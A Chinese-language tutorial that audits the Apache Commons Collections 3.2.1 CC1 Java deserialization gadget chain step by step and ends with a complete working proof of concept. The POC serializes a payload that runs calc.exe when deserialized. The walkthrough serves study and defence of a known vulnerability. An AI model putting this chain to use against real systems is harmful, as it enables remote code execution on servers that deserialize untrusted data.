[TOC]



# ==ApacheCC1链审计-mine==

#### 一、Common Collections简介

##### 1、基本功能

Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具 类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发。可以在Apache官网下载CC的jar文件和源代码，用于代码审计。https://commons.apache.org/proper/commons-collections/ ，本教程以3.2.1版本为例，JDK版本必须在1.8.0_71以下，因为之后的版本无法利用 sun.reflect.annotation.AnnotationInvocationHandler 类进行反序列化处理。可以在此下载JDK源码：https://hg.openjdk.org/jdk8u/jdk8u60/jdk/file/935758609767/src/share/classes （此版本针对1.8.0_60，如果是其他版本，则浏览 https://hg.openjdk.org/ 即可）。

Java集合框架：称为Collection，是Java中存在的一系列操作List、Set和Map的类的集合。Commons Collections扩展了集合框架，增强了很多功能。

##### 2、代码示例

```java
package com.ymqyyds.vul;

import org.apache.commons.collections.OrderedMap;
import org.apache.commons.collections.map.LinkedMap;

import java.util.HashMap;
import java.util.Map;

public class CommonCollection {

    public static void main(String[] args) throws Exception{
        // 常规的HashMp是无序存放的，目的是提升性能
        Map<String,String> map = new HashMap<>();
        map.put("one","111");
        map.put("two","222");
        map.put("three","33");
        map.put("four","444");
        map.put("five","555");
        map.put("six","666");

        for (String key : map.keySet()) {
            System.out.println("key: " + key + "  value: " + map.get(key));  // 顺序为 6 4 1 2 3 5
        }

        System.out.println("-----------------------------------");

        //但如果使用Common-Collection中的OrderMap就是有序的
        OrderedMap ordermap = new LinkedMap();

        ordermap.put("one","111");
        ordermap.put("two","222");
        ordermap.put("three","33");
        ordermap.put("four","444");
        ordermap.put("five","555");
        ordermap.put("six","666");

        for (Object key : ordermap.keySet()) {
            System.out.println("key: " + key + "  value: " + ordermap.get(key));  // 顺序为 1 2 3 4 5 6
        }
        System.out.println(ordermap.firstKey());
        System.out.println(ordermap.lastKey());
        System.out.println(ordermap.nextKey("three"));
    }
}
```

##### 3、CC1链调用过程

```
ObjectInputStream.readObject()
	AnnotationInvocationHandler.readObject()        
		Map().setValue()        
		TransformedMap.decorate()            
			ChainedTransformer.transform()                
				ConstantTransformer.transform()                
				InvokerTransformer.transform()                   
                	Method.invoke()                    
                	Class.getMethod()                
                InvokerTransformer.transform()                    
                	Method.invoke()                    
                	Runtime.getRuntime()                
                InvokerTransformer.transform()                    
                	Method.invoke()                    
                	Runtime.exec()
```

#### 二、基本的调用链梳理

1、在org.apache.commons.collections.functors中，存在一个InvokerTransformer类，该类的定义如下：

```java
public class InvokerTransformer implements Transformer, Serializable {

    /** The serial version */
    private static final long serialVersionUID = -8653385846894047688L;
    
    /** The method name to call */
    private final String iMethodName;
    /** The array of reflection parameter types */
    private final Class[] iParamTypes;
    /** The array of reflection arguments */
    private final Object[] iArgs;
```

2、可以看出，该类实现了Serializable接口，所以可以实现序列化和反序列化。进一步审计发现该类存在transform方法，可以进行反序列化操作。

```java
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

万恶之源来自如下几句代码

```java
Class cls = input.getClass();
Method method = cls.getMethod(iMethodName, iParamTypes);
return method.invoke(input, iArgs);
```

其中 input 是该方法的参数；iMethodName、iParamTypes（Class []）、iArgs（Class []） 三个都是该类的私有属性

同时寻找到了，该类存在 传递参数的构造方法

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}
```

刚好就是我们上文中所说的三个参数。

综上所述，这几句的意思是，利用 input 的类，进行类反射，并且获取其中的方法进行执行。

那么我们就可以让 input 是 Runtime 类，然后 iMethodName 是 exec ；iParamTypes 是 String[].class；iArgs 就是我们想要执行的指令

3、也就是说，如果直接调用该类的transform方法，则可以实现RCE：

```java
public void test1(){
    Runtime runtime = Runtime.getRuntime();
    // 测试直接通过调用是否可以进行代码执行
    // 先把构造方法所需要的三个参数准备好
    String iMethodName = "exec";
    Class[] iParamTypes = new Class[] {String.class};
    Object[] iArgs = new Object[] {"calc.exe"};

    // 利用构造好的属性创建 invokerTransformer 对象
    InvokerTransformer invokerTransformer = new InvokerTransformer(iMethodName,iParamTypes,iArgs);

    invokerTransformer.transform(runtime);
}
```

上述代码的执行结果可以调用出我的计算器，表明，此处（即InvokerTransfomer类的transform方法）可以作为漏洞利用的终点。

4、所以要看哪个类调用了transform方法就可以进行分析。通过查找， 发现在TransformedMap里边的checkSetValue调用了transform。

```java
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

此时 只需要调用这个方法并且传入参数 value 为 runtime ，然后 设置属性 valueTransformer 为下面的

此时需要使用 TransformedMap 类的实例来调用 checkSetValue 这个方法

但是我们想要实例化TransformedMap 并且传入参数单单使用TransformedMap 的构造方法是不行的，因该该类的构造方法是 protected 的

```java
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
```

既然这样，我们就无法直接通过构造方法来实例化。

无法直接，那就间接呢？

5、所以来看看，类中哪个方法调用了构造方法并且传入了参数

我们找到了 TransformeredMap 类中的 decorate 方法在调用 类的构造方法并且直接传入参数

由于这个方法是静态方法，所以通过类名直接可以调用

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

6、所以我们构建代码

```java
public void test2() throws Exception{
    // 万恶之源起于InvokerTransformer
    // 使用 transform 进行反射调用transform方法，确认无误
    Runtime runtime = Runtime.getRuntime();

    // 测试直接通过调用是否可以进行代码执行
    // 先把构造方法所需要的三个参数准备好
    String iMethodName = "exec";
    Class[] iParamTypes = new Class[] {String.class};
    Object[] iArgs = new Object[] {"calc.exe"};
    InvokerTransformer invokerTransformer = new InvokerTransformer(iMethodName,iParamTypes,iArgs);

    Map map = new HashMap();
    Transformer keyTransformer = null;
    Transformer valueTransformer = invokerTransformer;
    //        TransformedMap transformedMap = (TransformedMap) TransformedMap.decorate(map,keyTransformer,valueTransformer);

    Map transformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer); 
}
```

但是

```
// 由于这里只能通过 接口（父类）定义，子类声明，导致父类中没有，子类中有的方法，在这里无法使用
// 比如我想在这里直接 decorate.checkSetValue() 是不行的 ，因为 Map 接口中没有这个方法，所以只能往上级找
// 所以在这里我们就要进入AbstractInputCheckedMapDecorator类中的MapEntry类，调用 setValue 方法
```

7、AbstractInputCheckedMapDecorator类中的MapEntry类

```java
static class MapEntry extends AbstractMapEntryDecorator {

    /** The parent map */
    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
}
```

根据代码我们知道，我们要设置 parent 为 TransformedMap

到此时，我们的构造链是这样的

## 正构造链

- org.apache.commons.collections.map.AbstractInputCheckedMapDecorator 类中的 static class MapEntry 静态类中调用的 setValue() 方法

```java
//org.apache.commons.collections.map.AbstractInputCheckedMapDecorator 下的
static class MapEntry extends AbstractMapEntryDecorator {

    /** The parent map */
    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
}
```

其中 setValue() 方法在调用 checkSetValue() 方法

- 让 parent 为 org.apache.commons.collections.map.TransformedMap 类，并且 value 值传为 runtime 对象。但由于 TransformedMap 类没有 public 的构造方法，但是 

  ```java
  public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
      return new TransformedMap(map, keyTransformer, valueTransformer);
  }
  
  
  protected Object checkSetValue(Object value) {
      return valueTransformer.transform(value);
  }
  ```

  类中的 decorate 这个静态方法可以调用构造方法，并且传参，关键点确保 valueTransformer 为 org.apache.commons.collections.functors.InvokerTransformer 类，去调用里面的 transform 方法

- 我们来看看org.apache.commons.collections.functors.InvokerTransformer 类中的 transform 方法

  ```java
  public Object transform(Object input) {
      if (input == null) {
          return null;
      }
      try {
          Class cls = input.getClass();
          Method method = cls.getMethod(iMethodName, iParamTypes);
          return method.invoke(input, iArgs);
  
      } catch (NoSuchMethodException ex) {
          throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
      } catch (IllegalAccessException ex) {
          throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
      } catch (InvocationTargetException ex) {
          throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
      }
  }
  ```

  其中 

  ```java
  Class cls = input.getClass(); 
  Method method = cls.getMethod(iMethodName, iParamTypes);
  return method.invoke(input, iArgs);
  ```

  这三句是重点，也是终点，我们只需要让 input 为 runtime；iMethodName 为 exec iParamTypes 为 String[].class；iArgs 为我们想要执行的指令就可以了，至于为什么一定是数组类型，请看该类属性的定义，如下：

  ```java
  public class InvokerTransformer implements Transformer, Serializable {
  
      /** The serial version */
      private static final long serialVersionUID = -8653385846894047688L;
  
      /** The method name to call */
      private final String iMethodName;
      /** The array of reflection parameter types */
      private final Class[] iParamTypes;
      /** The array of reflection arguments */
      private final Object[] iArgs;

至此，也就完成了调用

## 反构造链

说白了，就是先从 org.apache.commons.collections.functors.InvokerTransformer 类中的 transform 方法开始，一直往上找，看谁在调用谁，调用之后看是否可以执行，这里就咱不细讲了

## 连接起点

但是，我们都知道，上述的调用链都还没有起点，我们要序列化数据，然后传到目标服务器让他进行反序列化，但我们也得找到对应的起点类，然后给他精心构造一下并对它进行序列化才行，可我们到现在都还没有找到起点，起点究竟在哪呢？

经过寻找，我们发现起点在 sun.reflect.annotation.AnnotationInvocationHandler 类中的 readObject() 方法。

该 readObject() 方法中执行了 memberValue.setValue() 方法，而 setValue() 方法正式我们上面中所说的临时起点，所以，起点类我们就找到了。

### 精心构造起点

我们先来看看他的 声明和构造方法。表示该类可以被序列化，同时构造函数所传参数需要 `Class<? extends Annotation> type, Map<String, Object> memberValues` 两个这样的参数。Annotation 是注解类型

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private static final long serialVersionUID = 6182022883658399397L;
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }
```

> 没有修饰符修饰的方法和属性，是默认修饰，只允许在同类和同包中使用

由于 该类没有 public 构造方法，所以这里只能通过反射来进行实例化

所以我们便有了以下的代码

```java
public void test3() throws Exception {
    Runtime runtime = Runtime.getRuntime();

    // 测试直接通过调用是否可以进行代码执行
    // 先把构造方法所需要的三个参数准备好
    String iMethodName = "exec";
    Class[] iParamTypes = new Class[] {String.class};
    Object[] iArgs = new Object[] {"notepad.exe"};
    InvokerTransformer invokerTransformer = new InvokerTransformer(iMethodName,iParamTypes,iArgs);

    Map map = new HashMap();
    map.put("key","value");  // 如果没有这句代码，那么是无法执行成功指令的，代码不会报错，但是也无法弹出 计算器
    Transformer keyTransformer = null;
    Transformer valueTransformer = invokerTransformer;
    //        TransformedMap transformedMap = (TransformedMap) TransformedMap.decorate(map,keyTransformer,valueTransformer);

    Map<Object,Object> transformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);

    // 现在需要找到，那里在调用 AbstractInputCheckedMapDecorator 类中的 MapEntry 静态类的 setValue 方法
    // 最终我们发现，在 jdk1.8.60 源码中的 rt.jar 包中的 sun 目录下的 reflect 目录下的 annotation 目录下的 AnnotationInvocationHandler 类中的 readObject() 方法中在调用
    // 并且，readObject() 刚好也是反序列化的起点

    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    Object object = constructor.newInstance(Override.class,transformedMap);  //  第一个参数要是注解类型，但是注解类型怎么表示不知道，暂用一个注解来代替
    // 在这里实例化 AnnotationInvocationHandler 类，同时传递我们想要的参数

    FileOutputStream fileOutputStream = new FileOutputStream("./data/ApacheCC1.ser");
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
    objectOutputStream.writeObject(object);
    // 然后在这里把实例化好的 AnnotationInvocationHandler 对象进行序列化作为 POC
}
```

经过序列化之后我们调用反序列化，代码如下：

```java
public void unserial() throws Exception{
    FileInputStream fileInputStream = new FileInputStream("./data/ApacheCC1.ser");
    ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
    objectInputStream.readObject();
}
```

结果发现，根本没有成功调用出计算器，所以代码还是有问题，我们来调试一下看看情况

![image-20250119135931306](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119135931306.png)

调试发现，memberType 直接就是 null ，连 if 条件都没进去，还谈什么调用

- **解决 memberTypes 为空的问题**

  `Class<?> memberType = memberTypes.get(name);` 意思是，去 memberTypes 里面 获取成员类型

  而 memberTypes 定义在 AnnotationInvocationHandler 中 `Map<String, Class<?>> memberTypes = annotationType.memberTypes();`

  然后 `memberTypes()` 方法是在 sun.reflect.annotation.AnnotationType 类中，定义如下

  ```java
  public Map<String, Class<?>> memberTypes() {
      return memberTypes;
  }
  ```

   上面所说连起来的意思就是 memberType 是 annotationType 的成员类型

  而 annotationType 是 

  ``` java
  annotationType = AnnotationType.getInstance(type);
  ```

   然后

   ```java
   private final Class<? extends Annotation> type;
   AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues)
   ```

  所以 annotationType 是我们所传入的注解类型，而 memberType 就是注解类型中的注解变量的成员属性

  > 什么叫 注解变量的成员属性 呢？
  >
  > 如下图所示，是 Override 注解变量的定义
  >
  > ![image-20250119143430772](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119143430772.png)
  >
  > 如下图所示，是 SuppressWarnings 注解变量的定义
  >
  > ![image-20250119143506331](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119143506331.png)
  >
  > 明显看到 SuppressWarnings 注解变量里面含有 String[] value(); 成员属性，所以在我们的 POC 中将 Override.class 替换成 SuppressWarnings.class
  >
  > 然后重新生成序列化数据再来调试

  ![image-20250119144252524](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119144252524.png)

  ok，失败了，我们来看看是什么回事 memberTypes 是 HashMap

  我们发现，经过更换注解类型传参，解决了 memberTypes 为 null 的问题，memberTypes 的size 变成了 1 ，说明 memberTypes  还是有东西的

  但是 memberType 为空，说明 get(name) 失败了

  我们看 name 的值为 ymq，再结合上一句代码，说明name的值就是我们定义的 map 变量中的 key

  然后 memberTypes.get(name) 得到的结果是 null，所以导致 memberType 是 null

- **解决 memberType 为空的问题**

  我们来看看 `memberTypes.get(name)` 这句代码到底啥意思

  从上面的调试结果我们看到 memberTypes 是 HashMap 类型

  意思是要从 memberTypes 里面取出 key 为 name 的值

  但是现在我们的 key 是 ymq，但是，我们并没有 map.put()

  **仔细看调试信息**

  ![image-20250119150114720](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119150114720.png)

  看 memberTypes 内部的信息：key=value；value=String[]，说明，我们要想让 memberTypes.get(name) 成功获取到东西 需要让 name=value，那么 memberTypes.get(value) 才能获取到 value=String[]，此时也才能让 memberType=String[]，他才不为空

  ![image-20250119150448991](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119150448991.png)

  > 知道为什么一定要让 name=value 吗？
  >
  > 因为：
  >
  > ![image-20250119150914055](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119150914055.png)
  >
  > 因为 SuppressWarnings 注解类型里面的成员属性名叫做 value。

  成功了

  接下来解决

  > ```java
  > memberType.isInstance(value)
  > ```
  >
  > 这句代码的意思是 判断 memberType 与 value 是不是一个类型
  >
  > 由于我们的 value 是 ymqyyds 是一个字符串 String 类型，并不是 String[] 类型

  那么我们运行一下反序列化代码看看啥情况

  ![image-20250119152854388](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119152854388.png)

  抛异常了，意思是，我们再执行如下代码时，未能找到 exec 这个方法

  ```java
  Class cls = input.getClass();
  Method method = cls.getMethod(iMethodName, iParamTypes);
  return method.invoke(input, iArgs);
  ```

  原因是因为我们的 POC 代码，还没有制米格我们想要的 对象去调用 exec

  此时 

  ![image-20250119153520872](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119153520872.png)

   setValue() 方法中传入的参数竟然是这么一个对象，这个对象肯定没有 exec 方法啊

## 引入其他两个类

为了改变 setValue 方法中所传的参数，让他是我们想要的类型，我们需要引入两个类

org.apache.commons.collections.functors.ConstantTransformer

```java
public Object transform(Object input) {
        return iConstant;
}
```

org.apache.commons.collections.functors.ChainedTransformer

```java
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

我在结束上面的学习之后我一直苦恼，我靠，这玩意咋转，人家都把类型写死了。当我第一次看到这两个类的这两个方法，我靠

**我震惊了，直呼牛逼**

- org.apache.commons.collections.functors.ConstantTransformer

  ```java
  public Object transform(Object input) {
          return iConstant;
  }
  ```

  这个方法，我直接让调用 setValue 的方法是 ConstantTransformer 类

  第一此给 AnnotationInvocationHandler 传入 ConstantTransformer 类实例，让ConstantTransformer 去执行transform方法，同时传入参数 iConstant 为 runtime

  **然后，重点来了**

- 上面第一次将 iConstant 设为 runtime之后

  运行

  ```java
  public Object transform(Object object) {
      for (int i = 0; i < iTransformers.length; i++) {
          object = iTransformers[i].transform(object);
      }
      return object;
  }
  ```

  所以第一次的 object 就变成了 runtime ，第二次传入invokertransform 的时候，就可以直接让 invokertransform 去调用 runtime，最终完成调用链

  需要注意的是，我们需要 iTransformers[i] 把 ConstantTransformer 和 invokertransform 包裹进 iTransformers[i] 数组中

### 看思路！

我先从起点到终点说一下思路

- AnnotationInvocationHandler 中调用 setValue 方法，并传入很恶心的参数

  ![image-20250119161443624](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119161443624.png)

  去寻找那里在调用 setValue 方法

- AbstractInputCheckedMapDecorator 中在调用 setValue 方法

  ![image-20250119161649877](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119161649877.png)

  去寻找 哪里在调用 checkSetValue 方法

- org.apache.commons.collections.map.TransformedMap 在调用 checkSetValue 方法，并再次调用 transform 方法

  ![image-20250119161759268](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119161759268.png)

  又由于 AbstractInputCheckedMapDecorator 是 TransformedMap 的父类，所以相当于在 TransformedMap 类中 同时调用 setValue  和 checkSetValue 方法

  继续寻找那里在调用 transform 方法

- org.apache.commons.collections.functors.ChainedTransformer 中调用的 transform 方法

  ![image-20250119161959845](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119161959845.png)

  第一次传入 iTransformers 为 org.apache.commons.collections.functors.ConstantTransformer

  ![image-20250119162040443](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119162040443.png)

  使得 AnnotationInvocationHandler 里的 

  ![image-20250119162117974](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119162117974.png)

  这一块东西消失不见，并且给ConstantTransformer中的 iConstant 传入Runtime对象，使得ConstantTransformer第一次循环返回的 object 是 runtime对象

  - 然后给ChainedTransformer 第二次传入 org.apache.commons.collections.functors.InvokerTransformer 对象，让他调用 transform 并且执行的内容input就是 runtime

    ![image-20250119162301010](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119162301010.png)

    然后分别让 iMethodName 是exec ；iParamTypes 是 InvokerTransformer 定义的类型，iArgs 是我们要执行的指令，同时也要满足 InvokerTransformer 定义的类型

- 所以我们需要把调用 transform 方法的三个类，包裹进 调用 checkSetValue 方法的类，然后把调用 checkSetValue 方法的类包裹进调用 SetValue 方法的类，而由于调用 checkSetValue 和 SetValue 是一个类型，只不过父子之别，所以可以直接略过，最后把调用 checkSetValue 和 SetValue 的类包裹进 AnnotationInvocationHandler 类，然后对 AnnotationInvocationHandler  进行序列化。over

### 看代码！

```java
public void test5()throws Exception {
    // 测试直接通过调用是否可以进行代码执行
    // 先把构造方法所需要的三个参数准备好
    String iMethodName = "exec";
    Class[] iParamTypes = new Class[] {String.class};
    Object[] iArgs = new Object[] {"calc.exe"};
    InvokerTransformer invokerTransformer = new InvokerTransformer(iMethodName,iParamTypes,iArgs);

    Map map = new HashMap();
    map.put("value","ymqyyds");  // 如果没有这句代码，那么是无法执行成功指令的，代码不会报错，但是也无法弹出 计算器

    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime().getClass());
    Transformer[] transformers = new Transformer[] {
        constantTransformer, // 先放这个的目的是让他先执行，返回runtime对象
        invokerTransformer  // 然后让 invokerTransformer 去执行 runtime
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    Transformer keyTransformer = null;
    Transformer valueTransformer = invokerTransformer;
    //        TransformedMap transformedMap = (TransformedMap) TransformedMap.decorate(map,keyTransformer,valueTransformer);
    Map<Object,Object> transformedMap = TransformedMap.decorate(map, keyTransformer, chainedTransformer);

    // 现在需要找到，那里在调用 AbstractInputCheckedMapDecorator 类中的 MapEntry 静态类的 setValue 方法
    // 最终我们发现，在 jdk1.8.60 源码中的 rt.jar 包中的 sun 目录下的 reflect 目录下的 annotation 目录下的 AnnotationInvocationHandler 类中的 readObject() 方法中在调用
    // 并且，readObject() 刚好也是反序列化的起点

    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    Object object = constructor.newInstance(SuppressWarnings.class,transformedMap);  //  第一个参数要是注解类型，但是注解类型怎么表示不知道，暂用一个注解来代替
    // 在这里实例化 AnnotationInvocationHandler 类，同时传递我们想要的参数

    FileOutputStream fileOutputStream = new FileOutputStream("./data/ApacheCC1.ser");
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
    objectOutputStream.writeObject(object);
    // 然后在这里把实例化好的 AnnotationInvocationHandler 对象进行序列化作为 POC
}
```

执行，对 AnnotationInvocationHandler 反射类进行序列化，然后我们在反序列化的过程中发生了错误

![image-20250119163854011](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119163854011.png)

是什么意思呢？错就错在

```java
ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime().getClass());
```

这句代码，我们正常情况就是 `Runtime.getRuntime().exec()` 来调用 exec，所以我在这里传参为 Runtime.getRuntime() ，但是为神马这里就失败了呢？

- 我们看看 Runtime.getRuntime().getClass() 有什么问题

  ![image-20250119164137880](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119164137880.png)

  没问题啊？

  把这句代码改成这样可以看看为什么

  ```java
  ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
  ```

  ![image-20250119164310051](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119164310051.png)

  果然，去看 Runtime 源码

  ![image-20250119164335825](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119164335825.png)

  Runtime 不能被序列化，好好好

- 既然不能被序列化，那么要想传入这个对象，就只能进行反射

  ```java
  Class clazz = Class.forName("java.lang.Runtime");
  Method m1 = clazz.getDeclaredMethod("getRuntime");  // 通过getRuntime() 这个方法来获取 Runtime 的实例
  Object obj = m1.invoke(clazz,null);
  Method m2 = clazz.getDeclaredMethod("exec",String.class);
  m2.invoke(obj,"calc.exe");
  ```

  但是这样反射之后的代码，我该如何给ConstantTransformer类传呢？因为在最后 InvokerTransformer 类中执行 transform 的时候还要在进行一次类反射，那我为何不直接在循环里多执行几次 InvokerTransformer 直接把 `Method m1 = clazz.getDeclaredMethod("getRuntime");` 和 `Method m2 = clazz.getDeclaredMethod("exec",String.class);` 代替了呢？

  ```java
  ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
  Transformer[] transformers = new Transformer[] {
      constantTransformer, // 先放这个的目的是让他先执行，返回runtime对象
      new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
      new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
      new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
  };
  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  ```

  注意，我要让他 ConstantTransformer 单纯返回一个 Runtime 对象，以便进行接下来的 InvokerTransformer 的transform 反射获取 getMethod 然后再反射获取 invoke，最后在反射执行 exec，所以给 ConstantTransformer 传参的时候就不能传 Runtime.getRuntime() 而是单纯的传一个 Runtime.class

  > 讲一下 是如何在 循环中 多次循环 new InvokerTransformer 来达到反射Runtime类型的目的的
  >
  > ![image-20250119212805615](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119212805615.png)
  >
  > 它的代码长这样，我们来看看每次循环里面都长什么样
  >
  > - 没开始循环之前：
  >
  >   ![image-20250119213944513](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119213944513.png)
  >
  > - 第一次循环： 说白了，就是执行 ConstantTransformer 的 transform 方法来返回 Runtime.class 对象![image-20250119213514021](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119213514021.png)
  >
  > - 第二次循环：input是Runtime.class；iMethodName是getMethod()；iParamTypes是getMethod()方法所需要的参数类型；iArgs是getRuntime()方法。最终返回Runtime.getRuntime()。目的是，调用 getMethod 方法来获取 getRuntime() 方法
  >
  >   ![image-20250119213540239](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119213540239.png)
  >
  > - 第三次循环：利上面拿到了 Runtime.getRuntime() ，此时此刻，input 就是Runtime.getRuntime()，那么input.getClass() 就真正获取到了 Runtime 对象，然后利用这个对象获取到 invoke 方法。
  >
  >   ![image-20250119213701701](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119213701701.png)
  >
  > - 第四次循环：invoke 方法有了之后，就可以执行 exec 方法了
  >
  >   ![image-20250119213732742](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250119213732742.png)

## 最终代码！！！

```java
public void test5()throws Exception {
    Map map = new HashMap();
    map.put("value","ymqyyds");  // 如果没有这句代码，那么是无法执行成功指令的，代码不会报错，但是也无法弹出 计算器

    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
    Transformer[] transformers = new Transformer[] {
        constantTransformer, // 先放这个的目的是让他先执行，返回runtime对象
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

    // 现在需要找到，那里在调用 AbstractInputCheckedMapDecorator 类中的 MapEntry 静态类的 setValue 方法
    // 最终我们发现，在 jdk1.8.60 源码中的 rt.jar 包中的 sun 目录下的 reflect 目录下的 annotation 目录下的 AnnotationInvocationHandler 类中的 readObject() 方法中在调用
    // 并且，readObject() 刚好也是反序列化的起点

    // 在这里实例化 AnnotationInvocationHandler 类，同时传递我们想要的参数
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    Object object = constructor.newInstance(SuppressWarnings.class,transformedMap);  //  第一个参数要是注解类型，但是注解类型怎么表示不知道，暂用一个注解来代替

    // 然后在这里把实例化好的 AnnotationInvocationHandler 对象进行序列化作为 POC
    FileOutputStream fileOutputStream = new FileOutputStream("./data/ApacheCC1.ser");
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
    objectOutputStream.writeObject(object);
}

public void unserial() throws Exception{
    FileInputStream fileInputStream = new FileInputStream("./data/ApacheCC1.ser");
    ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
    objectInputStream.readObject();
}
```

终于啊...

